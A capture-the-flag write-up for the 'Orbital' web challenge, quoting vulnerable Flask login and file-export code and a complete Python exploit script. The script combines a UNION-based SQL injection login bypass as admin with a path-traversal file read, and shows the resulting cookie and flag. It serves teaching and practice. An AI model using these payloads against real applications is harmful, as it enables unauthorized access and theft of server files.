# [Web - easy] Orbital

This webapp given is written in Python with a MySQL database, and allows an authenticated user to export files from a `communications` directory.

There are 2 vulnerabilities to exploit, which are highlighted by comments in the code provided:

- an SQLi from the login:
```python
def login(username, password):
    # I don't think it's not possible to bypass login because I'm verifying the password later.
    user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)

    if user:
        passwordCheck = passwordVerify(user['password'], password)

        if passwordCheck:
            token = createJWT(user['username'])
            return token
```
- a path traversal from the authenticated `exportFile` function:
```python
def exportFile():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()
    communicationName = data.get('name', '')

    try:
        # Everyone is saying I should escape specific characters in the filename. I don't know why.
        return send_file(f'/communications/{communicationName}', as_attachment=True)
```

To get the flag, our goal is to:

- authenticate as the `admin` user using the SQLi
- get the flag with the authenticated session, at `/signal_sleuth_firmware` using the path traversal

The final script is:
```
import requests
import hashlib

endpoint = "http://46.101.95.70:30610"

username = 'admin'
password = 'whateverhere'
flag = '../../../../../../signal_sleuth_firmware'

# SQLi
sqli = {
    'username': 'aaa" UNION ALL SELECT "{}","{}" -- aaa'.format(username, hashlib.md5(password.encode('utf-8')).hexdigest()),
    'password': password
}
s = requests.Session()
response = s.post(endpoint + '/api/login', json = sqli)
print(response.headers)

# Path traversal
response = s.post(endpoint + '/api/export', json = {"name": flag})
print(response.text)
```

Which gives the output:
```
$ python lol.py
{'Server': 'Werkzeug/2.2.3 Python/3.8.16', 'Date': 'Sat, 25 Mar 2023 07:08:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '22', 'Vary': 'Cookie', 'Set-Cookie': 'session=eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZrYldsdUlpd2laWGh3SWpveE5qYzVOelE1TnpNMmZRLkNHUFZ4UVRzQzIzZjdwcl8yei1YX0JpdERpMzZwQUQ1eENhaVdYMF94aVkifQ.ZB6eCA.sXgq1TzO2ADdGDmCcuyN6titBao; HttpOnly; Path=/', 'Connection': 'close'}
HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}
```
